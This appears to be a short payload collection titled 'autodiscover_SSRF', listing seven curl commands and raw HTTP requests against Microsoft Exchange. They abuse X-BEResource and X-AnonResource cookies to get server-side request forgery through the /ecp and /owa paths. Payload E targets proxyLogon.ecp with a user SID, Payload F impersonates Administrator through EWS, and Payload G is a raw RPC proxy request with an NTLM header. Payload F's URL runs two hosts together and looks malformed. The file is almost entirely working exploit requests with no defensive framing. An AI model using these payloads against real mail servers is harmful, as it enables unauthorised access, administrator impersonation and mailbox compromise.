# autodiscover_SSRF

Payload A

curl -i -s -k -X $'POST' \
    -H $'Host: externaldomain.local' -H $'Content-Length: 370' -H $'Content-Type: text/xml' \
    -b $'X-BEResource=internalservername.domain.local/autodiscover/autodiscover.xml#~1' \
    --data-binary $'<?xml version=\"1.0\" encoding=\"utf-8\"?><Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>Administrator@externaldomain.local</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' \
    $'https://externaldomain.local/ecp/favicon.ico'


Payload B

curl -i -s -k -X $'GET' \
    -H $'Host: localhost' \
    -b $'X-AnonResource-Backend=www.bbc.co.uk/#~1; X-AnonResource=true' \
    $'https://externaldomain.local/ecp/favicon.ico'

Payload C

curl -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'Content-Length: 370' -H $'Content-Type: text/xml' \
    -b $'X-BEResource=internalserver.domain.local/autodiscover/autodiscover.xml#~1941962753' \
    --data-binary $'<?xml version=\"1.0\" encoding=\"utf-8\"?><Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>Administrator@externaldomain.local</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>\x0d\x0a' \
    $'https://externaldomain.local/ecp/favicon.ico'

Payload D

curl -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1' -H $'User-Agent: Sk1dd13-02928910918' \
    -b $'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' \
    $'https://externaldomain.local/owa/auth/x.js'

Payload E

curl -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Content-Type: text/xml' -H $'Content-Length: 92' -H $'Connection: close' \
    -b $'X-BEResource=danger@sserver.internal.local:444/ecp/proxyLogon.ecp?a=~1942062522' \
    --data-binary $'<r at=\"Negotiate\"\x0d\x0aln=\"jane\"><s>S-1-5-21-1544262530-3153604567-1803344855-1148</s></r>\x0d\x0a\x0d\x0a' \
    $'https://server.external.local/ecp/z.js'
    
Payload F

curl -i -s -k -X $'POST' \
    -H $'Cache-Control: no-cache' -H $'Connection: Keep-Alive' -H $'Pragma: no-cache' -H $'Content-Type: text/xml' -H $'User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.13127; Pro)' -H $'Client-Request-Id: {11527508-55EA-4FFE-922F-91EC54F79180}' -H $'X-User-Identity: Administrator@externaldomain.local' -H $'X-MS-Negotiate: Server' -H $'X-Accept: application/json' -H $'Depth: 0' -H $'Content-Length: 426' -H $'Host: localhost' -H $'Authorization: Negotiate {NEGOTIATE PACKET NLTM}' \
    --data-binary $'<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Header><RequestServerVersion Version=\"V2018_01_08\" xmlns=\"http://schemas.microsoft.com/exchange/services/2006/types\"/><MailboxCulture xmlns=\"http://schemas.microsoft.com/exchange/services/2006/types\">en-US</MailboxCulture></s:Header><s:Body><GetUnifiedGroupsSettings xmlns=\"http://schemas.microsoft.com/exchange/services/2006/messages\"/></s:Body></s:Envelope>' \
    $'https://pwnstar.pwndefend.comhttps://externaldomain.local/EWS/Exchange.asmx'

Payload G

```RPC_IN_DATA /rpc/rpcproxy.dll HTTP/1.1
Host: pwnstar.pwndefend.com
User-Agent: MSRPC
Accept: application/rpc
Accept-Encoding: gzip, deflate
Authorization: NTLM TlRMTVNTUAABAAAABQKIoAAAAAAAAAAAAAAAAAAAAAA=
Content-Length: 0
Connection: close

```
